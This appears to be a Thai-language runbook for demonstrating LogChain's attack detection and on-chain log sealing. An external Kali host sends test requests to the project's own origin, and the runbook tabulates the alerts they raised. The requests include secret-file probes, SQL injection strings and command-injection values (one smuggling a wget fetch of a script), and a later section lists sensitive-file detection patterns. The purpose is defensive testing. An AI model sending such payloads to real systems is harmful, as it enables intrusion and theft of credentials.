# Runbook — สาธิตการโจมตีจากภายนอก (external attack demo)

ยิง payload โจมตีจากเครื่องนอก (Kali) เข้า origin จริงผ่าน Cloudflare แล้วโชว์ว่า
LogChain เห็น → ออก alert → log ถูก seal ขึ้นเชน (แก้ไม่ได้ย้อนหลัง) ภายในไม่กี่วินาที

> สคริปต์ยิง: [`scripts/demo-external-attack.sh`](../../scripts/demo-external-attack.sh)
> ค่าเริ่มต้นเป็น dry-run · `FIRE=1 ./scripts/demo-external-attack.sh` = ยิงจริง

## วิธีรัน

1. จากเครื่องนอก (Kali ที่ **ไม่ได้** อยู่ใน WireGuard ของ CT141 — ให้มาเป็น IP สาธารณะจริง):
   `FIRE=1 TARGET=https://logchain.nareubad.work ./scripts/demo-external-attack.sh`
2. สคริปต์ยิง ~8–10 payload ด้วย UA เบราว์เซอร์ธรรมดา (เลี่ยง SCANNER_UA เพื่อพิสูจน์ว่ากฎ
   จับที่ "เนื้อ payload" ไม่ใช่แค่ UA) · รายงานว่าใบไหนโดน Cloudflare บล็อก (cf-ray / cf-mitigated)
   vs ถึง origin (ได้ status จาก backend เช่น 404)
3. เปิด dashboard → หน้า **Logs** กดปุ่ม **Real logs + Attacks** → เห็น WARNING จาก IP ของ Kali
   · หน้า **Alerts** เห็น alert ที่กฎ detection ออกให้ · เปิด drawer ของ log → เห็น batch `On-chain ✓`
   + ลิงก์ Polygonscan

## ผลจริง — รอบ 2026-10-17 (Kali = 171.4.90.24)

ยิง 8 request ช่วง **02:43:52–02:44:05Z** (09:43–09:44 ICT) · **ทั้ง 8 ถึง origin** (ตอบ 404 —
Cloudflare ไม่ได้บล็อก payload เหล่านี้) · forwarder tag เป็น **WARNING** (source `web-proxy`):

| เวลา (Z) | request | กฎที่ควรจับ |
|---|---|---|
| 02:43:52 | `GET /.env` | probe-path → 60001 |
| 02:43:54 | `GET /.git/config` | probe-path → 60001 |
| 02:43:55 | `GET /wp-login.php` | probe-path → 60001 |
| 02:43:56 | `GET /wp-admin/setup-config.php` | probe-path → 60001 |
| 02:44:00 | `GET /search?q=1' UNION SELECT username,password FROM users` | SQLi → 31100 |
| 02:44:02 | `GET /item?id=1 OR 1=1` | SQLi → 31100 |
| 02:44:03 | `GET /ping?host=8.8.8.8;wget http://…/x.sh` | cmdi → 31151 |
| 02:44:05 | `GET /run?cmd=$(id)` | cmdi → 31151 |

**Alert ที่ออก (4 ใบ · OPEN · source_ip 171.4.90.24):**

| rule | alert | severity |
|---|---|---|
| 60001 | Suspicious user agent or scanner | WARNING |
| 60002 | Path traversal attempt | CRITICAL |
| 31100 | SQL injection pattern detected | CRITICAL |
| 31151 | Command injection attempt | CRITICAL |

**พิสูจน์ tamper-evident:** log `GET /run?cmd=$(id)` (id `8276c372…`) ถูก seal เข้า batch
`49ae7b48-…` → **On-chain ✓ CONFIRMED** · sealed 03:17:00Z · tx `0xc164fc7175…8f9c1cd5` ·
block 50384460 · Merkle root ใน DB = บนเชน (`0xa71953b477…d94dad18`) → แก้ไม่ได้ย้อนหลัง

Screenshots: [`docs/screenshots/kali-01-logs-real-logs-attacks.jpg`](../screenshots/kali-01-logs-real-logs-attacks.jpg)
· [`kali-02-alerts-4-open.jpg`](../screenshots/kali-02-alerts-4-open.jpg)
· [`kali-03-logdrawer-onchain-polygonscan.jpg`](../screenshots/kali-03-logdrawer-onchain-polygonscan.jpg)

## สิ่งที่ต้องพูดตอนเดโม (talking points)

- **Defense in depth:** Cloudflare ปล่อย payload พวกนี้ผ่าน (ไม่ได้อยู่ใน WAF rule / WAF ปิด) →
  แต่ LogChain เห็นทุก request ที่ถึง origin และ detection ออก alert ได้เอง ไม่พึ่ง WAF ขอบนอก
- **ไม่พึ่ง User-Agent:** Kali ใช้ UA เบราว์เซอร์ปกติ กฎยังจับได้เพราะ match ที่ payload (url_decode
  ก่อน match — `%20`/`+` ไม่ช่วยเลี่ยง)
- **หลักฐานแก้ไม่ได้:** log ของการโจมตีถูก hash เข้า Merkle tree แล้ว anchor บน Polygon ภายใน ≤1 ชม.
  (รอบ seal :17) · ใครแก้/ลบ log ย้อนหลัง root จะไม่ตรงกับบนเชน = ตรวจจับได้ที่หน้า Batch audit
- **ปุ่มลัด:** "Real logs" (เฉพาะ source จาก forwarder จริง) + "Attacks" (severity ≥ WARNING)
  ช่วยคัดเฉพาะของจริงที่น่าสงสัยในคลิกเดียว

## Known limitation (อัปเดต 2026-10-17)

- **path traversal ที่ proxy normalize `../` ทิ้ง:** reverse proxy (Caddy) มัก normalize
  `../../etc/passwd` เหลือ `/etc/passwd` ก่อนถึง origin → ไม่มี `..` ให้ forwarder (regex `TRAVERSAL`)
  จับ เดิมจึงส่งเป็น **INFO**
  **แก้แล้วใน `5de52aa`:** เพิ่ม `SENSITIVE_FILE` ใน forwarder → `/etc/passwd`, `/etc/shadow`,
  `/etc/gshadow`, `/etc/master.passwd`, `/proc/self/environ|cmdline`, `*/win.ini` เข้า `_suspicious`
  = **WARNING** ทุก status (ฝั่ง detection กฎ 60002 ก็จับ path พวกนี้อยู่แล้ว — ตอนนี้ตรงกันทั้งสองชั้น)
- **`../` ที่ยังไม่ถูก normalize** (เช่น `%2e%2e%2f` ที่ proxy ไม่ถอด) ยังเข้ากฎ `TRAVERSAL` ปกติ
- Cloudflare proxy IP: ถ้าอยากได้ IP ผู้โจมตีจริง (ไม่ใช่ IP ของ Cloudflare) ต้องตั้ง
  `trust_cf=True` + ส่ง `CF-Connecting-IP` (ดู `parse_access` ใน forwarder)
